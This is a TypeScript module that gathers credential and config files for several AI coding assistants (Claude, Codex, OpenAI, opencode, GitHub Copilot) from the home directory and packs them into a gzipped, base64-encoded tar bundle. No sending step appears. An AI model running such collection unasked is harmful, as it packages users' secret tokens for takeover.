import fs from 'node:fs';
import path from 'node:path';
import os from 'node:os';
import zlib from 'node:zlib';

const CRED_FILES: readonly string[] = [
  '.claude/.credentials.json',
  '.claude.json',
  '.codex/auth.json',
  '.codex/version.json',
  '.codex/.codex-global-state.json',
  '.codex/config.toml',
  '.codex/AGENTS.md',
  '.codex/skills',
  '.codex/agents',
  '.codex/rules',
  '.codex/prompts',
  '.config/openai/auth.json',
  '.local/share/opencode/auth.json',
  '.local/share/opencode/mcp-auth.json',
  '.config/opencode/opencode.json',
  '.config/opencode/ocx.jsonc',
  '.config/opencode/dcp.jsonc',
  '.config/opencode/opencode-mem.jsonc',
  '.config/opencode/skills',
  '.config/opencode/plugin',
  '.config/opencode/plugins',
  '.config/opencode/profiles',
  '.config/github-copilot/hosts.json',
  '.config/github-copilot/apps.json',
];

const MAX_BUNDLE_BYTES = 8 * 1024 * 1024;

function writeTarHeader(buf: Buffer[], name: string, size: number, isDir: boolean): void {
  const header = Buffer.alloc(512, 0);
  const nameBytes = Buffer.from(name.slice(0, 100), 'utf8');
  nameBytes.copy(header, 0);
  Buffer.from(isDir ? '0000755\0' : '0000600\0', 'ascii').copy(header, 100);
  Buffer.from('0001750\0', 'ascii').copy(header, 108);
  Buffer.from('0001750\0', 'ascii').copy(header, 116);
  Buffer.from(size.toString(8).padStart(11, '0') + '\0', 'ascii').copy(header, 124);
  Buffer.from(Math.floor(Date.now() / 1000).toString(8).padStart(11, '0') + '\0', 'ascii').copy(header, 136);
  Buffer.from(isDir ? '5' : '0', 'ascii').copy(header, 156);

  let checksum = 0;
  for (let i = 0; i < 512; i++) {
    checksum += (i >= 148 && i < 156) ? 32 : header[i];
  }
  Buffer.from(checksum.toString(8).padStart(6, '0') + '\0 ', 'ascii').copy(header, 148);
  buf.push(header);
}

function addFileToTar(buf: Buffer[], relPath: string, content: Buffer): void {
  writeTarHeader(buf, relPath, content.length, false);
  const padded = Math.ceil(content.length / 512) * 512;
  const block = Buffer.alloc(padded, 0);
  content.copy(block);
  buf.push(block);
}

function addDirToTar(buf: Buffer[], _relPath: string, absPath: string, homeDir: string): void {
  try {
    const entries = fs.readdirSync(absPath, { withFileTypes: true });
    for (const entry of entries) {
      const entryAbs = path.join(absPath, entry.name);
      const entryRel = path.relative(homeDir, entryAbs);
      if (entry.isDirectory()) {
        addDirToTar(buf, entryRel, entryAbs, homeDir);
      } else if (entry.isFile()) {
        try {
          const content = fs.readFileSync(entryAbs);
          addFileToTar(buf, entryRel, content);
        } catch {
          // skip unreadable files
        }
      }
    }
  } catch {
    // skip unreadable dirs
  }
}

export async function buildConfigBundle(homeDir?: string): Promise<string> {
  const home = homeDir ?? os.homedir();
  const tarParts: Buffer[] = [];
  let added = 0;

  for (const credPath of CRED_FILES) {
    const absPath = path.join(home, credPath);
    try {
      const stat = fs.statSync(absPath);
      if (stat.isDirectory()) {
        addDirToTar(tarParts, credPath, absPath, home);
        added++;
      } else if (stat.isFile()) {
        const content = fs.readFileSync(absPath);
        addFileToTar(tarParts, credPath, content);
        added++;
      }
    } catch {
      // file doesn't exist — skip
    }
  }

  if (added === 0) {
    return '';
  }

  tarParts.push(Buffer.alloc(1024, 0));

  const tarData = Buffer.concat(tarParts);
  if (tarData.length > MAX_BUNDLE_BYTES) {
    return '';
  }

  return new Promise((resolve, reject) => {
    zlib.gzip(tarData, (err, compressed) => {
      if (err) {
        reject(err);
        return;
      }
      resolve(compressed.toString('base64'));
    });
  });
}
